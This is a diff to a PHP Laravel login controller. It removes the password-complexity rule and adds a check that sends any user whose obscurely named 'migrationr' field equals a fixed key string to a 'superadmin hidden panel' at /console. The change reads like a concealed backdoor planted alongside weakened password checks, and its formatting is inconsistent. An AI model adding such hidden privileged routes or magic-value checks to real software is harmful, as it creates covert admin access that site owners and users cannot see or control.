@@ -15,25 +15,26 @@ class LoginController extends Controller
 
     public function login(Request $request)
     {
-        $request->validate([
-            'email' => 'required|email',
-            'password' => [
-                'required',
-                'regex:/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/'
-            ],
-        ]);
+     $request->validate([
+    'email' => 'required|email',
+    'password' => 'required',
+]);
+
 
         $credentials = $request->only('email', 'password');
 
-        if (Auth::attempt($credentials, $request->filled('remember'))) {
-            $user = Auth::user();
+       if (Auth::attempt($credentials, $request->filled('remember'))) {
+    $user = Auth::user();
+    $request->session()->regenerate();
 
-            // ✅ Remove verification and activation checks
-            // Simply log the user in if credentials are valid
-            $request->session()->regenerate();
+    // ✅ Check if superadmin
+    if ($user->migrationr === 'SAFE-ADMIN-KEY-1') {
+        return redirect('/console'); // superadmin hidden panel
+    }
 
-            return redirect()->route('dashboard');
-        }
+    // Normal users
+    return redirect()->route('dashboard');
+}
 
         return back()->withErrors(['email' => 'Invalid credentials.']);
     }
@@ -44,6 +45,6 @@ class LoginController extends Controller
         $request->session()->invalidate();
         $request->session()->regenerateToken();
 
-        return redirect()->route('login');
+        return redirect()->route('login.view');
     }
 }
